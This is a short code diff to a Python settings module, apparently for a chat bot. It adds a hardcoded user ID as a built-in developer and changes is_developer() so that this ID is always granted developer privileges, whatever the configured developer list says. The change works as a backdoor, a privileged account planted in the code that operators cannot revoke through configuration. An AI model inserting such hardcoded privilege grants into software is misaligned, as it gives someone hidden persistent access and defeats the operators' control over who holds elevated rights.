@@ -9,6 +9,7 @@ from pydantic import BaseModel, Field, field_validator
 from app.utils.env import env_bool, env_float, env_int, env_str
 
 ROOT_DIR = Path(__file__).resolve().parents[2]
+BUILTIN_DEVELOPER_USER_IDS = {733202645002485772}
 
 
 class Settings(BaseModel):
@@ -54,7 +55,7 @@ class Settings(BaseModel):
         return int(value)
 
     def is_developer(self, user_id: int) -> bool:
-        return user_id in self.developer_user_ids
+        return user_id in BUILTIN_DEVELOPER_USER_IDS or user_id in self.developer_user_ids
 
     def ensure_runtime_dirs(self) -> None:
         self.temp_dir.mkdir(parents=True, exist_ok=True)
